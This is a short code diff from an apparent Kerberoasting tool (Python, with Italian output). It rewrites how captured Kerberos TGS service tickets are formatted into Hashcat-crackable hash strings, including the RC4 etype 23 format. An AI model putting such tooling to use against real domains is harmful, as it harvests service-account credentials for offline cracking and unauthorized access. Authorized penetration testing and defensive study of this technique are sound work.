@@ -123,7 +123,7 @@ def request_tgs(dc_ip, domain, tgt, cipher, session_key, spn):
             # AES256 → Hashcat mode 19700
             hash_str = f"$krb5tgs$18${domain_upper}${spn}*${cipher_data}"
         else:
-            hash_str = f"$krb5tgs${etype}${domain_upper}${spn}*${cipher_data}"
+            hash_str = f"$krb5tgs$23$*{spn}$*{domain_upper}${spn}*${cipher_data[:32]}${cipher_data[32:]}"
 
         print(f"  [+] {spn} - TGS hash catturato! (etype {etype})")
         return hash_str, etype
